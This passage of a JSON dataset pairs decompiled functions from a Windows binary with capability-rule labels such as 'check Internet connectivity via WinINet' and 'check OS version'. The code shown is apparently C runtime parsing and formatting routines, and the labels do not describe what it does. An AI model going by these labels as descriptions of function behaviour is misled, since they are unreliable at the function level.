            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405592(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004055ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004055ab(uint arg_8h)\n\n{\n    int32_t iStack72;\n    \n    for (iStack72 = 0x43; 0 < iStack72; iStack72 = iStack72 + -1) {\n    }\n    fcn.00403b02();\n    return *0x546bc4;\n}\n",
        "token_count": 79
    },
    "004055e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055e2(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00405687": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405687(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004028c4(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "004056aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004056aa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t arg_10h_00;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int16_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    char *pcVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    uint uVar16;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0x8c);\n    iVar14 = *(unaff_EBP + 0x18);\n    uVar7 = *(iVar14 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.004065c8(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar14, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x00470d72;\n    }\n    fcn.004032d3(*(iVar14 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00405466(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x94) = piVar5;\n    fcn.00405146();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x60);\n    (*pcVar2)();\n    uVar16 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x84);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.004032d3(uVar16);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.0040347c(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x578000)(\"0123456789-+Ee\", 0x55483f, unaff_EBP + -0x30);\n    (*pcVar2)();\n    uVar16 = *(unaff_EBP + -0x68);\n    cVar3 = fcn.00401a8c(uVar16);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        if (iVar11 == *(unaff_EBP + -0x1a)) {\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405d21();\n                iVar11 = *(arg_10h_00 + 6);\n            }\n            if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x004707e2;\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.00404863();\n    }\n    else {\ncode_r0x004707e2:\n        puVar6 = *(unaff_EBP + -0x74);\n    }\n    piVar5 = *(unaff_EBP + -0x90);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar13 = puVar6 + 1;\n    *(unaff_EBP + -0x74) = pcVar13;\n    iVar14 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x98) = ((iVar14 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar15 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar15;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar15 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar15;\n    }\n    if ((*pcVar15 == '\\x7f') || (*pcVar15 < '\\x01')) {\n        cVar3 = fcn.00401a8c(uVar16);\n        if (cVar3 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                uVar7 = fcn.0040378d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                iVar14 = *(unaff_EBP + -0x7c);\n                if (*(unaff_EBP + -0x98) == iVar14 || *(unaff_EBP + -0x98) < iVar14) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar14 != 0)) {\n                    *pcVar13 = \"0123456789-+Ee\"[uVar7];\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x7c) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.00404863();\n                cVar3 = fcn.00401a8c(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x74) = pcVar13;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x80) = 0;\n        }\n        else {\n            uVar7 = fcn.004017d0();\n            *(unaff_EBP + -0x80) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n        if (cVar3 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x34);\n            pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x00470999:\n            do {\n                pcVar12 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar3 = *pcVar12,  *(unaff_EBP + -0x69) = cVar3,  cVar3 == '\\x7f'))\n                    goto code_r0x004709ee;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) != pcVar12[iVar14]) goto code_r0x004709ea;\n                    }\n                    if (iVar14 == 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) < *pcVar12) goto code_r0x004709ea;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405d21();\n            }\n            uVar7 = fcn.0040378d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x7c);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x98) == iVar8 || *(unaff_EBP + -0x98) < iVar8) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar13 = \"0123456789-+Ee\"[uVar7];\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x74) = pcVar13;\n                    *(unaff_EBP + -0x7c) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar8 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar8 + iVar14) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar8 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar8 + iVar14) = *(iVar8 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x34);\n                pcVar15 = *(unaff_EBP + -0x48);\n                pcVar12 = unaff_EBP + -0x48;\n                if (0xf < uVar7) {\n                    pcVar12 = pcVar15;\n                }\n                if ((pcVar12[iVar14] == '\\0') || (*(unaff_EBP + -0x80) == 0)) goto code_r0x0047097c;\n                iVar11 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                    iVar11 = *(arg_10h_00 + 6);\n                    uVar7 = *(unaff_EBP + -0x34);\n                    pcVar15 = *(unaff_EBP + -0x48);\n                }\n                if (iVar11 != *(unaff_EBP + -0x80)) goto code_r0x0047097c;\n                fcn.00404543(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.00404863();\n            cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n        } while (cVar3 == '\\0');\n        uVar7 = *(unaff_EBP + -0x34);\n        pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x0047097c:\n        if (iVar14 == 0) goto code_r0x00470999;\n        pcVar12 = unaff_EBP + -0x48;\n        if (0xf < uVar7) {\n            pcVar12 = pcVar15;\n        }\n        if ('\\0' < pcVar12[iVar14]) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x00470999;\n        }\ncode_r0x004709ea:\n        *(unaff_EBP + -99) = 1;\ncode_r0x004709ee:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x78) = pcVar15;\n            *(unaff_EBP + -0x80) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.0040411a(unaff_EBP + -0x78, unaff_EBP + -0x80);\n                pcVar15 = *(unaff_EBP + -0x78);\n            }\n            fcn.00401a2d(pcVar15);\n        }\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = fcn.00401a8c(0x470a2f);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        iVar4 = fcn.0040621c();\n        if (iVar11 == iVar4) {\n            puVar9 = fcn.00401357();\n            puVar6 = *(unaff_EBP + -0x74);\n            *puVar6 = **puVar9;\n            pcVar13 = puVar6 + 1;\n            *(unaff_EBP + -0x74) = pcVar13;\n            fcn.00404863();\n        }\n        else {\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x90) != 1000000000) && (*(unaff_EBP + -0x7c) == 0)) {\n        cVar3 = fcn.00401a8c(uVar16);\n        if (cVar3 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x70);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.00404863();\n                cVar3 = fcn.00401a8c(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x70) = iVar14;\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < 0) {\n            *pcVar13 = '0';\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n    }\n    while (cVar3 = fcn.00401a8c(uVar16),  cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        uVar7 = fcn.0040378d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar7) break;\n        iVar14 = *(unaff_EBP + -0x7c);\n        if (iVar14 < *(unaff_EBP + -0x98)) {\n            *pcVar13 = \"0123456789-+Ee\"[uVar7];\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x7c) = iVar14 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.00404863();\n    }\n    pcVar15 = pcVar13;\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        while (pcVar15 = pcVar15 + -1,  pcVar15 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x90) = pcVar15;\n            ppcVar10 = fcn.00401357();\n            cVar3 = *pcVar15;\n            if (cVar3 != **ppcVar10) {\n                if (cVar3 != '9') {\n                    pcVar12 = *(unaff_EBP + -0x90);\n                    *pcVar15 = cVar3 + '\\x01';\n                    pcVar15 = pcVar12;\n                    if (pcVar12 != *(unaff_EBP + -0x88)) goto code_r0x00470c0a;\n                    break;\n                }\n                *pcVar15 = '0';\n            }\n        }\n        *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n        *pcVar15 = '1';\ncode_r0x00470c0a:\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = *(unaff_EBP + -0x61);\n    pcVar15 = pcVar13;\n    if (cVar3 != '\\0') {\n        cVar3 = fcn.00401a8c(uVar16);\n        if (cVar3 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405d21();\n            }\n            iVar11 = *(arg_10h_00 + 6);\n            if (iVar11 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                    iVar11 = *(arg_10h_00 + 6);\n                }\n                if (iVar11 != *(unaff_EBP + -0x18)) goto code_r0x00470d51;\n            }\n            *pcVar13 = 'e';\n            pcVar15 = pcVar13 + 1;\n            fcn.00404863();\n            *(unaff_EBP + -0x61) = 0;\n            iVar14 = 0;\n            cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                iVar11 = *(arg_10h_00 + 6);\n                if (iVar11 == *(unaff_EBP + -0x1a)) {\n                    *pcVar15 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00405d21();\n                        iVar11 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x00470cb5;\n                    *pcVar15 = '-';\n                }\n                pcVar15 = pcVar13 + 2;\n                fcn.00404863();\n            }\ncode_r0x00470cb5:\n            cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                do {\n                    cVar1 = *(arg_10h_00 + 4);\n                    cVar3 = *(unaff_EBP + -0x61);\n                    *(unaff_EBP + -0x61) = cVar3;\n                    if (cVar1 == '\\0') {\n                        fcn.00405d21();\n                        cVar3 = *(unaff_EBP + -0x61);\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) {\n                        if (cVar3 == '\\0') goto code_r0x00470d06;\n                        break;\n                    }\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.00404863();\n                    cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n                } while (cVar3 == '\\0');\n                *pcVar15 = '0';\n                pcVar15 = pcVar15 + 1;\n            }\ncode_r0x00470d06:\n            do {\n                cVar3 = fcn.00401a8c(*(unaff_EBP + -0x68));\n                if (cVar3 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405d21();\n                }\n                uVar7 = fcn.0040378d(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                if (iVar14 < 8) {\n                    *pcVar15 = \"0123456789-+Ee\"[uVar7];\n                    pcVar15 = pcVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.00404863();\n            } while( true );\n        }\ncode_r0x00470d51:\n        cVar3 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar3 == '\\0')) {\n        pcVar15 = *(unaff_EBP + -0x84);\n    }\n    *pcVar15 = '\\0';\n    fcn.00402a0e();\ncode_r0x00470d72:\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 5601
    },
    "00405718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405718(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049fcf2;\n            param_1[7] = 8;\ncode_r0x0049fbbd:\n            puStack8 = 0x49fbc2;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x49fbcd;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049fbbd;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049fcf2;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049fcf2;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049fcf2;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049fcf2;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049fcf2;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049fcf2;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049fcf2:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049fcf2;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a1a2a:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a1a2e:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1a31:\n            cVar5 = fcn.004069ce(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a19d6:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1a31;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a19ea;\n                if (uVar9 < 0x45) goto code_r0x004a1bba;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a1bba;\n                    goto code_r0x004a19be;\n                }\n            }\ncode_r0x004a1a3a:\n            cVar5 = fcn.0040684d();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00406244();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a1a3a;\n            if (uVar9 != 99) goto code_r0x004a1bba;\ncode_r0x004a19ea:\n            cVar5 = fcn.0040101e(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00406758();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a1a3a;\n            if (uVar9 == 0x69) goto code_r0x004a1a2a;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00402063();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a1bba;\n                cVar5 = fcn.004028f6();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a1bba;\n                arg_ch_00 = 0;\n                goto code_r0x004a19d6;\n            }\n            goto code_r0x004a1a2e;\n        }\ncode_r0x004a19be:\n        cVar5 = fcn.00402d92();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004a1bba;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a1ac5;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a1ac5:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.004040ed(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.00403003(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a1bba:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2660
    },
    "00405768": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
